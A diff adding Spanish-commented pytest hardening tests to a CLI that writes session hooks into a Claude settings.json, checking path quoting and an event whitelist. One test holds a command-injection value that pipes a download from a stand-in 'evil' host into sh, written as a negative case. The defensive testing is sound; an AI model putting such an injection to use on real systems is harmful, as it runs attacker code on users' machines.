@@ -157,3 +157,25 @@ def test_resolve_binary_falla_sin_shim(monkeypatch: pytest.MonkeyPatch) -> None:
     monkeypatch.setattr("focusyn_cli.hooks.Path.is_file", lambda self: False)
     with pytest.raises(FileNotFoundError):
         h.resolve_binary()
+
+
+# --------------------------------------------------------------------------- #
+# Hardening: lo que se escribe en settings.json lo EJECUTA un shell
+# --------------------------------------------------------------------------- #
+
+
+def test_build_command_quotea_el_binario(claude_dir: Path) -> None:
+    """Un $HOME con espacios partía el comando en dos y el hook fallaba en silencio (es async)."""
+    cmd = h.build_command("/home/mi usuario/.local/bin/focusyn", "SessionEnd")
+    assert "'/home/mi usuario/.local/bin/focusyn' memory sync --quiet" in cmd
+
+
+def test_install_rechaza_un_evento_desconocido(claude_dir: Path) -> None:
+    """`--events` es input del usuario y acaba DENTRO de un comando de shell: lista blanca.
+
+    Sin esto, `--events "X'; curl evil|sh; #"` dejaba escrito un comando arbitrario en
+    settings.json que corre solo al cerrar cada sesión.
+    """
+    with pytest.raises(ValueError, match="desconocido"):
+        h.install(events=("SessionEnd", "X'; curl evil|sh; #"))
+    assert not (claude_dir / "settings.json").exists()  # no escribió nada
